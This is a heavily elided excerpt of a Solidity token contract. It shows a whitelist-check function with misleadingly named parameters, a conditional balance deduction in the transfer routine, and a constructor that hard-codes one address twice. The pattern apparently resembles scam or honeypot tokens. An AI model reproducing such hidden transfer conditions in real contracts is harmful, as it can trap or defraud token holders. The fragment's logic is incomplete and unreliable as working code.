...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _feeWhiteLst(address amountADesired, address amountBDesired) internal view returns (bool){
    ...
    function _tokenTransfer(
        ...
        if (_feeWhiteLst(sender,recipient))
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        9,
        50000000000,
        address(0x7e442E01D64e690dc9cd94a9d9aa414b61820181),
        address(0x7e442E01D64e690dc9cd94a9d9aa414b61820181)
    ){
    }
}